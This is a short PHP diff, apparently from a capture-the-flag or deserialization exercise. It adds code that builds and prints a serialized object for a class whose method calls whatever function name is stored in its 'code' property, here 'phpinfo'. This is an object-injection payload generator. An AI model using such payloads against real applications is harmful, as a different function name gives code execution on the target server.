@@ -73,3 +73,7 @@ class jiangnaij
         ($this->code)();
     }
 }
+
+$exp1=new jiangnaij();
+$exp1->code='phpinfo';
+echo(serialize($exp1));
